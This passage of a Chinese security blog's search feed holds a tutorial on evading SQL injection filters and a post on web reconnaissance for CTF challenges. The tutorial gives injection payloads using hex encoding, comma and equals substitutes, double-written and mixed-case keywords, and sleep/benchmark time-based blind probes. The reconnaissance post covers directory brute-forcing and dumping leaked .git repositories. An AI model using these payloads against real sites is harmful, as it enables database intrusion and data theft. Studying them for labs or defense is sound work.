class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">users <span class="operator">=</span> <span class="number">0x7573657273</span></span><br><span class="line">security <span class="operator">=</span> <span class="number">0x7365637572697479</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.COLUMNS <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7573657273</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="number">0x7365637572697479</span></span><br></pre></td></tr></table></figure><h3 id="3、绕过逗号"><a href="#3、绕过逗号" class="headerlink" title="3、绕过逗号"></a>3、绕过逗号</h3><p><code>left()</code> <code>substr()</code> 等字符串处理函数中存在<code>,</code></p><p><strong>使用 <strong><strong><code>substr()</code></strong></strong> ，</strong><strong><code>mid()</code></strong>** ，及****<code>from to</code>**</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br><span class="line"><span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><code>limit</code> 中存在<code>,</code></p><p><strong>使用</strong>**<code>offset</code>**<strong>进行绕过</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> security.users limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> </span><br></pre></td></tr></table></figure><p><code>union select 1,2,3</code> 等联合查询中多列之间存在<code>,</code></p><p><strong>使用</strong>**<code>join</code>**<strong>进行绕过</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 等价于</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">UNION</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C);</span><br></pre></td></tr></table></figure><h3 id="4、绕过等号"><a href="#4、绕过等号" class="headerlink" title="4、绕过等号"></a>4、绕过等号</h3><p><strong>使用</strong><strong><code>like</code><strong><strong>、</strong></strong><code>rlike</code><strong><strong>、</strong></strong><code>regexp</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username rlike <span class="string">&#x27;dumb&#x27;</span></span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="keyword">where</span> username regexp <span class="string">&#x27;dumb&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="5、绕过or-and-not-xor"><a href="#5、绕过or-and-not-xor" class="headerlink" title="5、绕过or and not xor"></a>5、绕过<code>or</code> <code>and</code> <code>not</code> <code>xor</code></h3><p><strong>使用等价符号进行绕过</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span><span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span>  <span class="operator">=</span><span class="operator">=</span> <span class="operator">||</span></span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span><span class="operator">=</span> ！</span><br><span class="line">xor <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span><span class="operator">^</span><span class="number">1</span>  # 相同为假，不同为真</span><br></pre></td></tr></table></figure><h3 id="6、绕过注释符号"><a href="#6、绕过注释符号" class="headerlink" title="6、绕过注释符号"></a>6、绕过注释符号</h3><p><strong>使用</strong><strong><code>#</code><strong><strong>、 <strong><strong><code>--+</code></strong></strong> 、</strong></strong><code>%23</code></strong>** 、****<code>--</code>****  进行注释**</p><p><code>#</code>和<code>--</code>  属于mysql的注释</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users # 这是#号注释</span><br><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> security.users <span class="comment">-- 这是-- 注释</span></span><br></pre></td></tr></table></figure><p><strong>使用闭合进行绕过</strong></p><blockquote><p>id&#x3D;1’ union select 1,2,3 || ‘1</p></blockquote><h3 id="7、绕过关键字"><a href="#7、绕过关键字" class="headerlink" title="7、绕过关键字"></a>7、绕过关键字</h3><p>SQL语句在最终执行之前，过滤其中的关键字</p><p><strong>双写关键字</strong></p><p>将黑名单中的关键字删除，但仅执行一次</p><blockquote><p>id&#x3D;1’ un<code>union</code>ion select 1,2,3–+</p></blockquote><p><strong>大小写混合</strong></p><p>在比对黑名单时，未忽略大小写</p><blockquote><p>id&#x3D;1’ UniON SElEcT 1,2,3–+</p></blockquote><p><strong>使用相同功能的关键词</strong></p><p><code>sleep()</code> &#x3D;&gt; <code>benchmark()</code> # benchmark 执行[参数一]次[参数二]</p><blockquote><p>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,<code>benchmark(99999999,md5(1))</code>,1)–+<br>?id&#x3D;1’ and if(left(database(),1)&#x3D;’s’,<code>sleep(5)</code>,1)–+</p></blockquote><p><code>left()</code> <code>right()</code> <code>mid()</code> <code>substr()</code> <code>lpad()</code> 等字处理函数</p><blockquote><p>?id&#x3D;1’ and <code>right</code>(database(),1)&#x3D;’y’–+<br>?id&#x3D;1’ and <code>left</code>(database(),1)&#x3D;’s’–+<br>?id&#x3D;1’ and <code>mid</code>(database(),1,1)&#x3D;’s’–+<br>?id&#x3D;1’ and <code>lpad</code>(database(),1,’z’)&#x3D;’s’–+</p></blockquote><p><code>into</code>代替<code>order by</code></p><blockquote><p>?id&#x3D;1’ into @1,@2–+<br>?id&#x3D;1’ into @1,@2,@3–+</p></blockquote><p><strong>使用其他的注入方法</strong></p><p>无列名注入</p><hr><p>参考资料：</p><p><a href="https://blog.csdn.net/soldi_er/article/details/116901009">https://blog.csdn.net/soldi_er&#x2F;article&#x2F;details&#x2F;116901009</a></p><p><a href="https://err0r.top/article/mardasctf/">https://err0r.top/article/mardasctf/</a></p><p><a href="https://blog.dkkkkk.com/basis/NoColumnInjection/">https://blog.dkkkkk.com/basis/NoColumnInjection/</a></p><p><a href="https://www.freebuf.com/column/165567.html">https://www.freebuf.com/column/165567.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2022/08/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2022/08/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网站信息泄露"><a href="#一、网站信息泄露" class="headerlink" title="一、网站信息泄露"></a>一、网站信息泄露</h2><h3 id="1、前端注释"><a href="#1、前端注释" class="headerlink" title="1、前端注释"></a>1、前端注释</h3><p>前端代码中存在注释</p><p>可以使用<code>F12</code> 、<code>Ctrl+U</code> 、<code>view-source:</code> 来进行查看</p><h3 id="2、请求头和响应头"><a href="#2、请求头和响应头" class="headerlink" title="2、请求头和响应头"></a>2、请求头和响应头</h3><p>在请求头和响应头中存在提示</p><p>可以使用<code>F12-网络</code>  、<code>抓包工具</code> 来进行查看</p><h3 id="3、敏感页面和目录"><a href="#3、敏感页面和目录" class="headerlink" title="3、敏感页面和目录"></a>3、敏感页面和目录</h3><p>使用目录爆破工具进行扫描</p><p><code>御剑</code>、<code>dirsearch</code> 、<code>dirmap</code> 等</p><p>Dirsearch：</p><blockquote><p>python <a href="http://dirsearch.py/">dirsearch.py</a> <code>-u</code> [URL] <code>-e</code> [php|python] <code>-w</code> [wordlist]</p></blockquote><h2 id="二、源码泄露"><a href="#二、源码泄露" class="headerlink" title="二、源码泄露"></a>二、源码泄露</h2><h3 id="1、网站备份文件"><a href="#1、网站备份文件" class="headerlink" title="1、网站备份文件"></a>1、网站备份文件</h3><p>例如：<code>index.php.bak</code> 、<code>www.zip</code> ……</p><p>包括数据库的备份文件</p><p>使用目录扫描工具可以扫出</p><h3 id="2、测试文件"><a href="#2、测试文件" class="headerlink" title="2、测试文件"></a>2、测试文件</h3><p>例如：<code>test.php</code></p><h3 id="3、-git-svn源码泄露"><a href="#3、-git-svn源码泄露" class="headerlink" title="3、.git .svn源码泄露"></a>3、<code>.git</code> <code>.svn</code>源码泄露</h3><p>开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。</p><p>通过目录扫描工具扫描出网站存在<code>/.git/</code> 目录，则证明存在.git泄露</p><p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a></p><p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h3 id="4、vim遗留文件"><a href="#4、vim遗留文件" class="headerlink" title="4、vim遗留文件"></a>4、<code>vim</code>遗留文件</h3><p>在vim异常关闭的时候会产生.swp文件</p><p>如果扩展名是 “.swp” 的文件已经存在，逐次递减最后的字母，直到找到没有现存文件的名字为止。</p><p>如果过了 “.saa” 还找不到，不建立交换文件。</p><p>常见：<code>.swp</code> <code>.swo</code> <code>.swn</code> …</p><p>使用：<code>vim -r filename</code> 进行恢复</p><h2 id="三、字典"><a href="#三、字典" class="headerlink" title="三、字典"></a>三、字典</h2><p><a href="https://github.com/gh0stkey/Web-Fuzzing-Box/blob/main/Dir/Ctf.txt">Web-Fuzzing-Box&#x2F;Ctf.txt at main · gh0stkey&#x2F;Web-Fuzzing-Box</a></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/08/24/hello-world/"/>
      <url>/2022/08/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>你好世界！！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
